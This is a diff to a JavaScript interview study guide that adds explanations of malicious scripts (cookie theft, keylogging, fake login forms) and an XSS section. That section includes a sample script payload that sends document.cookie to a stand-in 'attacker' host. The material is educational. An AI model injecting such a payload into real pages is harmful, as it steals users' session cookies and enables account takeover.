@@ -1125,6 +1125,30 @@ function addMethod(object, name, fn){
 }
 ```
 
-### 37. What is XSS attack?
+### 37.1 What is malicious JS and its consequences?
 
-Referenced: http://www.veracode.com/security/xss
+* JavaScript has access to some of the user's sensitive information, such as cookies.
+* JavaScript can send HTTP requests with arbitrary content to arbitrary destinations by using XMLHttpRequest and other mechanisms.
+* JavaScript can make arbitrary modifications to the HTML of the current page by using DOM manipulation methods.
+
+##### Consequences:
+
+* **Cookies theft** The attacker can access the victim's cookies associated with the website using document.cookie, send them to his own server, and use them to extract sensitive information like session IDs.
+
+* **Keylogging** The attacker can register a keyboard event listener using addEventListener and then send all of the user's keystrokes to his own server, potentially recording sensitive information such as passwords and credit card numbers.
+
+* **Phishing** The attacker can insert a fake login form into the page using DOM manipulation, set the form's action attribute to target his own server, and then trick the user into submitting sensitive information.
+
+### 37.2 What is XSS attack?
+
+Referenced:
+* http://www.veracode.com/security/xss
+* http://excess-xss.com/
+
+```javascript
+<script>
+window.location='http://attacker/?cookie='+document.cookie
+</script>
+```
+
+
